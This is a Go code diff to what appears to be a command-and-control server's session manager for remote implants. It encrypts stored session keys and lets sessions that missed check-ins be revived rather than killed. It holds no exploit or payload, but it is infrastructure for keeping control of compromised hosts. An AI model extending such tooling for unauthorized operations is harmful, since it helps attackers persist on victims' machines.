@@ -10,10 +10,11 @@ import (
 )
 
 type Manager struct {
-	mu       sync.RWMutex
-	sessions map[string]*Session // keyed by session_id
-	byImplant map[string]string  // implant_id -> session_id
-	store    *db.Store
+	mu        sync.RWMutex
+	sessions  map[string]*Session // keyed by session_id
+	byImplant map[string]string   // implant_id -> session_id
+	store     *db.Store
+	masterKey []byte // 32-byte AES key to seal session keys at rest; nil = plaintext (tests)
 }
 
 func NewManager(store *db.Store) *Manager {
@@ -22,6 +23,37 @@ func NewManager(store *db.Store) *Manager {
 		byImplant: make(map[string]string),
 		store:     store,
 	}
+}
+
+// SetMasterKey configures sealing of session keys at rest. Key must be 32 bytes.
+func (m *Manager) SetMasterKey(key []byte) {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	if len(key) == 32 {
+		m.masterKey = append([]byte(nil), key...)
+	}
+}
+
+func (m *Manager) sealSessionKey(key []byte) ([]byte, error) {
+	if len(key) == 0 {
+		return nil, nil
+	}
+	if len(m.masterKey) != 32 {
+		return key, nil
+	}
+	return crypto.Seal(m.masterKey, key)
+}
+
+func (m *Manager) openSessionKey(sealed []byte) ([]byte, error) {
+	if len(sealed) == 0 {
+		return nil, nil
+	}
+	if len(m.masterKey) != 32 {
+		// Tests / no master key: treat blob as plaintext.
+		return sealed, nil
+	}
+	// Fail closed: never treat ciphertext as a raw AES key.
+	return crypto.Open(m.masterKey, sealed)
 }
 
 // RecoverSessions loads alive sessions from the database into memory.
@@ -58,8 +90,15 @@ func (m *Manager) RecoverSessions() error {
 			LastCheckin:     row.LastCheckin,
 			Alive:          true,
 		}
-		if row.SessionKey != nil {
-			sess.SessionKey = row.SessionKey
+		if len(row.SessionKey) > 0 {
+			key, err := m.openSessionKey(row.SessionKey)
+			if err != nil {
+				// Fail closed: recover session without key; implant must re-register.
+				fmt.Printf("[sessions] warning: cannot decrypt session key for %s (implant must re-register): %v\n",
+					row.SessionID, err)
+			} else {
+				sess.SessionKey = key
+			}
 		}
 		m.sessions[row.SessionID] = sess
 		m.byImplant[row.ImplantID] = row.SessionID
@@ -87,7 +126,11 @@ func (m *Manager) RegisterOrReconnect(sess *Session) (sessionID string, isReconn
 			existing.RemoteAddr = sess.RemoteAddr
 			existing.IntegrityLevel = sess.IntegrityLevel
 			if m.store != nil {
-				if err := m.store.UpdateSessionKey(existingID, sess.SessionKey); err != nil {
+				sealed, err := m.sealSessionKey(sess.SessionKey)
+				if err != nil {
+					return "", false, fmt.Errorf("seal session key: %w", err)
+				}
+				if err := m.store.UpdateSessionKey(existingID, sealed); err != nil {
 					return "", false, fmt.Errorf("update session key: %w", err)
 				}
 				if err := m.store.UpdateSessionMetadata(existingID, sess.Hostname, sess.Username, int(sess.PID), sess.RemoteAddr); err != nil {
@@ -110,6 +153,10 @@ func (m *Manager) RegisterOrReconnect(sess *Session) (sessionID string, isReconn
 	m.byImplant[sess.ImplantID] = newID
 
 	if m.store != nil {
+		sealed, err := m.sealSessionKey(sess.SessionKey)
+		if err != nil {
+			return "", false, fmt.Errorf("seal session key: %w", err)
+		}
 		if err := m.store.CreateSession(&db.SessionRow{
 			SessionID:      sess.SessionID,
 			ImplantID:      sess.ImplantID,
@@ -124,7 +171,7 @@ func (m *Manager) RegisterOrReconnect(sess *Session) (sessionID string, isReconn
 			RegisteredAt:   sess.RegisteredAt,
 			LastCheckin:     sess.LastCheckin,
 			Alive:          true,
-			SessionKey:     sess.SessionKey,
+			SessionKey:     sealed,
 		}); err != nil {
 			return "", false, fmt.Errorf("persist session: %w", err)
 		}
@@ -198,6 +245,8 @@ func (m *Manager) UpdateCheckin(sessionID string) {
 }
 
 // Reaper marks sessions as dead if they haven't checked in within timeout.
+// Soft-dead only (MarkDead): late check-in may revive. Operator Kill sets
+// terminateRequested and does not revive.
 func (m *Manager) Reaper(timeout time.Duration) {
 	// Collect stale sessions under read lock
 	m.mu.RLock()
@@ -211,9 +260,9 @@ func (m *Manager) Reaper(timeout time.Duration) {
 	}
 	m.mu.RUnlock()
 
-	// Kill outside lock to avoid holding manager lock during DB writes
+	// Mark dead outside lock to avoid holding manager lock during DB writes
 	for _, s := range stale {
-		s.Kill()
+		s.MarkDead()
 		if m.store != nil {
 			m.store.KillSession(s.SessionID)
 		}
